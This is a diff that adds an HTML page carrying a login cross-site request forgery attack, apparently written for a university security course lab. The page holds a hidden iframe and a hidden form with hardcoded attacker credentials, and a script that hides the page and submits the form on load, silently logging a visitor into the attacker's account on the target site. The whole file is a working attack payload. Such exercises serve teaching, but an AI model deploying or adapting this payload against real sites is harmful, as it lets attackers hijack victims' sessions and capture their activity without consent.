@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+  <body>
+    <iframe name="hiddenFrame" style="display:none" aria-hidden="true"></iframe>
+    <form name="f" method="post" 
+      action="http://cpsc4200.mpese.com/login?csrfdefense=0&xssdefense=4"
+      target="hiddenFrame">
+      <input id="username" name="username" type="hidden" value="attacker"> 
+      <input id="userpass" name="password" type="hidden" value="l33th4x">
+    </form>
+    <script>
+      document.documentElement.style.visibility = 'hidden';
+      document.f.submit();
+    </script>
+  </body>
+</html>
